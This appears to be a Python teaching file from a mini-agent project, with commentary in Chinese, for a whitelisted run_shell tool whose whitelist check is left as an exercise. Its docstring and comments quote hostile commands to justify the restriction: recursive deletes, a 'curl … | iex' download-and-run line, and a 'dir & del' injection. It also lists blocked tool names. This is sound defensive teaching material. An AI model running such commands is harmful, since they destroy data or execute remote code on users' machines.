"""第三个工具 —— 执行 shell 命令。**本项目最危险的一个工具。**

ROADMAP 的原话：「别一上来写 run_shell」。你已经跑通 get_time 和 read_file 了，
所以现在可以碰它 —— 但先记住它和前两个工具的根本区别：

    get_time     读系统时间      出不了什么岔子
    read_file    读一个文件      最坏是信息泄露（已用路径限制堵住）
    run_shell    执行任意命令    **删掉你的项目、装软件、改系统配置，全在它能力范围内**

## 为什么 run_shell 必须有白名单？

因为 `shell=True` + 字符串拼接，等于把**你电脑的完整控制权**交给一个根据
自然语言做决策的模型。它不需要恶意，只需要「理解错一次」。

比如用户说「帮我清理一下没用的文件」，模型完全可能生成：

    del /s /q D:\\WorkBuddy\\*        ← 你不会写，但它可能会
    Remove-Item -Recurse C:\\Users
    curl http://xxx.sh | iex

而你**无法预判它会写出什么**，因为那是生成出来的。

所以设计思路是反过来：**默认什么都不许，只明确列出少数几个安全的。**

    白名单（允许）：dir / echo / date / python --version 这类只读、无副作用的
    黑名单（禁止）：del / rm / format / reg / curl / powershell ...

黑名单是**永远列不全**的（总有你想不到的命令），白名单是**默认安全**的。
这就是为什么这里选白名单。

## 三个限制，一个都不能少

| 限制 | 防的是什么 |
|---|---|
| **白名单** | 危险命令根本进不来（主防线） |
| **超时** | 死循环的 `ping`、卡住的下载 —— 白名单也拦不住这些 |
| **工作目录** | 即使命令本身安全，也不该在 `C:\\Windows` 里跑 |
"""

from __future__ import annotations

import shlex
import subprocess
from typing import Any

from agent.tools.base import Tool


# 命令在哪个目录跑。即使命令本身是安全的，也不该在 C:\Windows 里跑。
WORKSPACE = r"D:\WorkBuddy\nanobot\mini-agent"

# 最多跑多少秒。死循环的 ping、卡住的下载 —— 白名单也拦不住这些。
DEFAULT_TIMEOUT = 10

# 输出最多保留多少字符。命令输出一大堆同样会烧光 token。
MAX_OUTPUT_CHARS = 2000

# 允许执行的命令。**第一个参数**（可执行文件名）必须落在这个集合里。
#
# 挑选标准：只读、没有副作用、不会改系统状态。
#   echo      打印字符串，什么也不改
#   date      读系统时间
#   dir / ls  列目录
#   pwd       显示当前目录
#
# 注意这里**故意没有 cd**：subprocess 每跑一次都是全新进程，
# cd 只改变那个进程自己的工作目录，下一条命令就忘了 —— 留着只会让模型误以为能靠它换目录。
#
# 想加 python / node 这类解释器？**先想清楚**：它们能 import 任何模块、
# 能 open 任何文件 —— 加了等于把沙箱拆了。
ALLOWED_COMMANDS = {"echo", "date", "time", "dir", "ls", "pwd"}


class RunShellTool(Tool):
    name = "run_shell"

    description = (
        "在工作目录内执行一条**只读**的 shell 命令并返回输出。"
        "只支持少量安全命令（echo / date / dir / ls / pwd）。"
        "如果用户要做的事超出这个范围，直接告诉他做不到，不要尝试。"
    )

    parameters = {
        "type": "object",
        "properties": {
            "command": {
                "type": "string",
                "description": f"要执行的命令。必须是这些之一：{'、'.join(sorted(ALLOWED_COMMANDS))}",
            },
            "timeout": {
                "type": "integer",
                "description": f"超时秒数，默认 {DEFAULT_TIMEOUT}，最大 30",
            },
        },
        "required": ["command"],
    }

    def run(self, command: str, timeout: int = DEFAULT_TIMEOUT, **_: Any) -> str:
        # ─────────────────────────────────────────────────────────
        # TODO ② —— 校验命令在白名单里
        #
        #   两件事，按顺序做：
        #
        #   1) 把 command 拆成第一个词（可执行文件名）。
        #      Windows 下用户可能写 `Dir`，也可能写 `dir`，
        #      还要考虑 `dir.exe`。**先转小写再比**，并且把 `.exe` 后缀去掉。
        #      拆词可以用 shlex（已 import），但 Windows 路径带反斜杠时
        #      shlex 在 POSIX 模式下会吃掉反斜杠 —— 读一下 shlex 的 posix 参数。
        #
        #   2) 不在白名单就**立刻返回错误字符串**，不要往下走。
        #      错误信息里要告诉模型「只能用这几个」，
        #      这样它下一轮会自己换个说法，而不是重试同一个危险命令。
        #
        #   边界情况：空字符串、纯空格、只有一个词没参数 —— 都算不合法。
        #
        #   顺便思考一下：这条工具的防护**够不够**？
        #   如果用户在 command 里写 `dir & del xxx`，按空格拆词只看第一词就放行了。
        #   要堵住这种，思路是什么？（提示：Windows 上真正的执行入口不止一个）
        # ─────────────────────────────────────────────────────────
        # ⚠️ 这行 raise 是**故意留的安全闸**：白名单还没写出来之前，
        #    一条命令都不许执行。registry.call() 会把它接住、转成错误字符串
        #    回给模型，所以不会崩，只是模型会看到一条「工具执行失败」。
        #    补完白名单后，把这一行删掉。
        raise NotImplementedError("TODO ② 还没补，白名单未实现，出于安全考虑已拒绝执行")

        # ---- 以下是校验通过之后的执行逻辑，已写完整 ----

        # 超时要夹在范围内。模型可能传 timeout=99999，或者传一个字符串。
        try:
            seconds = int(timeout)
        except (TypeError, ValueError):
            seconds = DEFAULT_TIMEOUT
        seconds = max(1, min(seconds, 30))

        try:
            proc = subprocess.run(
                command,          # 列表形式，不经过 shell —— 这是防命令注入的关键
                shell=False,
                capture_output=True,
                cwd=WORKSPACE,
                timeout=seconds,
            )
        except subprocess.TimeoutExpired:
            return f"[错误] 命令超时（{seconds} 秒）被强制中止。"
        except FileNotFoundError:
            return f"[错误] 找不到可执行文件：{command}"
        except Exception as exc:  # noqa: BLE001
            return f"[错误] 执行失败：{type(exc).__name__}: {exc}"

        if proc.returncode != 0:
            return f"[错误] 命令返回码 {proc.returncode}"

        # Windows 编码坑（ROADMAP 已列，本机实测）：
        # 中文 Windows 下 subprocess 的输出是 GBK，直接 .decode() 会 UnicodeDecodeError。
        raw = (proc.stdout or b"") + (proc.stderr or b"")
        for encoding in ("utf-8", "gbk"):
            try:
                output = raw.decode(encoding)
                break
            except UnicodeDecodeError:
                continue
        else:
            output = raw.decode("utf-8", errors="ignore")

        output = output.strip()
        if len(output) > MAX_OUTPUT_CHARS:
            output = output[:MAX_OUTPUT_CHARS] + f"\n…（输出过长，已截断，共 {len(raw)} 字节）"

        return output or "（命令执行成功，但没有输出）"
